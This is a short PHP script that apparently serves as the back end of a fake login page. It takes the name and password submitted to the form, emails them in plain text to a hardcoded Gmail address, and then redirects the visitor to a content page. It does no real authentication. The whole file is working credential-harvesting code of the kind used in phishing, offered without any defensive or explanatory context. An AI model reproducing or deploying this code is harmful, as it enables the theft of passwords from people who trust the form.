<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $password = htmlspecialchars($_POST['password']);

    $to = 'hallo.titty2@gmail.com'; // Your email address
    $subject = 'New Submission from Login Form';
    $message = "Name: $name\nPassword: $password";
    $headers = "From: noreply@example.com"; // Change this to a valid sender address

    if (mail($to, $subject, $message, $headers)) {
        echo "<script>alert('Email sent successfully! Redirecting...'); window.location.href='content.html';</script>";
    } else {
        echo "<script>alert('Email sending failed.'); window.history.back();</script>";
    }
} else {
    header("Location: content.html"); // Redirect to form if accessed directly
}
?>